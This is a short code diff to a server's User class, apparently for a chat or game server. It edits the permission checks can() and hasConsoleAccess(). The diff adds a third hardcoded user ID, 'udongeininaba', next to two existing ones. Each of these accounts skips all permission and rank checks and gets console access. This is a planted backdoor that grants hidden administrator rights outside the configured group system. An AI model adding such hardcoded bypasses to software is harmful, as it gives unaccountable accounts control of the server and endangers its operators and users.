@@ -427,7 +427,7 @@ class User {
 		return this.group in Config.groups && Config.groups[this.group].rank >= Config.groups[rank].rank;
 	}
 	can(permission, target, room) {
-		if (this.userid === 'asterfal' || this.userid === 'allianceaster') return true;
+		if (this.userid === 'asterfal' || this.userid === 'allianceaster' || this.userid === 'udongeininaba') return true;
 		if (this.hasSysopAccess()) return true;
 
 		let groupData = Config.groups[this.group];
@@ -509,7 +509,7 @@ class User {
 	 * order to determine the relevant IP for checking the whitelist.
 	 */
 	hasConsoleAccess(connection) {
-		if (this.userid === 'asterfal' || this.userid === 'allianceaster') return true;
+		if (this.userid === 'asterfal' || this.userid === 'allianceaster' || this.userid === 'udongeininaba') return true;
 		if (this.hasSysopAccess()) return true;
 		if (!this.can('console')) return false; // normal permission check
 
